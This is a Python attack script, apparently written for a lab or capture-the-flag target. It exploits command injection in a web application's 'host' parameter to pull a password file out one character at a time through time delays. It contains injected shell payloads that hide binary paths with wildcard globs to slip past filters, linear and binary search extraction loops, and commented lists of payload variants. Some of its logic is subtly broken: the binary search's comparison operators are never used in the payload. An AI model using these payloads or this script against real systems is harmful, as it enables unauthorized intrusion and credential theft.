
from time import sleep
import requests
import argparse
from os import sys
from typing import Dict

def parse_args():
    
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url",  help="Remote URL", type=str, dest="url")
    
    args = parser.parse_args()
    
    url:str = args.url
    
    if url is None or url == "":
        print("URL PARAMETER NOT PROVIDED")
        sys.exit(-1)
    
    return url

def make_get_request(url:str, 
                     timeout=10):
    ret_val:bool = False
    try:
        response:requests.Response = requests.get(url=url, timeout=timeout)
        if response.status_code != 200:
            print(response.status_code)
            return False
    except:
        ret_val = True
        sleep(1.1)
    
    return ret_val

def determine_password_length(url:str, timeout=10):
    
    data = {}
    sleep:int = timeout + 1
    for i in range(0,100):
        
        
        
        print(f"Attempting password length: {i}")
        if make_get_request(url, timeout):
            print(f"PASSWORD LENGTH FOUND!! ({i})")
            return i

    return -1



def determine_password_request(url:str, 
                               timeout:int,
                               len:int, 
                               char_code:int, 
                               sleep:int,
                               operator:str):    
    url = url + '?host=127.0.0.1; /u?r/b?n/t?il -c +'+str(len)+' /etc/password.txt | /u?r/b?n/h?ad -c 1 | { read v; [[ "$v" == "'+chr(char_code)+'" ]] && /u?r/b?n/sl??p '+str(sleep)+' || /u?r/b?n/?s; }'
    print(f"Attempting to see if ascii-code={char_code} is '{operator}' than the unknown character at position {len} : url={url}")
    return make_get_request(url, timeout)



def linear_search_determine_password(url:str, password_len:int, timeout=10):
    sleep:int = timeout + 1
    password:str = ""
    for len in range(1, password_len + 1):
        for char_code in range(35, 126):
            if determine_password_request(url, timeout, len, char_code, sleep, "="):
                print("CHARACTER FOUND!! " + chr(char_code) + " is the character at postion " + str(len))
                password += chr(char_code)
                print("PASSWORD: " + password)
                break
    return password




def binary_search_determine_password(url:str, password_len:int, timeout:int=10):
    
    def binary_search_determine_character(url:str, len:int, timeout=10):
        
        print(f"Starting binary search for postion {len}")
        low = 33
        high = 126
        mid = 0
        sleep = timeout + 1
    
        while low <= high:
    
            mid = (high + low) // 2
    
            if determine_password_request(url=url, 
                                        timeout=timeout, 
                                        len=len, 
                                        char_code=mid, 
                                        sleep=sleep,
                                        operator=">"):
                low = mid + 1
    
            elif determine_password_request(url=url, 
                                        timeout=timeout, 
                                        len=len, 
                                        char_code=mid, 
                                        sleep=sleep,
                                        operator="<"):
                high = mid - 1
    
            else:
                return mid
        
        return None
    
    password = ""
    for len in range(1, password_len + 1):
        char_code = binary_search_determine_character(url, len, timeout)
        
        if char_code is None:
            print("FAILED TO FIND PASSWORD")
            return None
        
        print("CHARACTER FOUND!! " + chr(char_code) + " is the character at postion " + str(len))
        password += chr(char_code)
        print("PASSWORD: " + password)
    return password



url:str = parse_args()
linear_search_determine_password(url, 10, 10)

# 127.0.0.1; /u?r/b?n/h??d -c 1 /e?c/password.txt | { read v; [ "$v" == "@" ] && /u?r/b?n/sl??p 11 || /u?r/b?n/?s; }
# 192.168.1.153; /u?r/b?n/h??d -c 1 /e?c/password.txt | { read v; [ "$v" == "a" ] && /u?r/b?n/sl??p 11 || /u?r/b?n/?s; }
# 127.0.0.1; [ 1 -eq 2 ] && /u?r/b?n/sl??p 5 || /u?r/b?n/?s;
# head -c 1 pass.txt | { read v; [ "$v" == "p" ] && /u?r/b?n/sl??p 5 || /u?r/b?n/ls; }
# /u?r/b?n/h??d -c 1 /e?c/password.txt | { read v; [ "$v" == "p" ] && /u?r/b?n/sl??p 5 || /u?r/b?n/?s; }
# /u?r/b?n/h??d -c 1 /e?c/password.txt | { read v; [ "$v" == "p" ] && /u?r/b?n/?s || /u?r/b?n/sl??p 5; }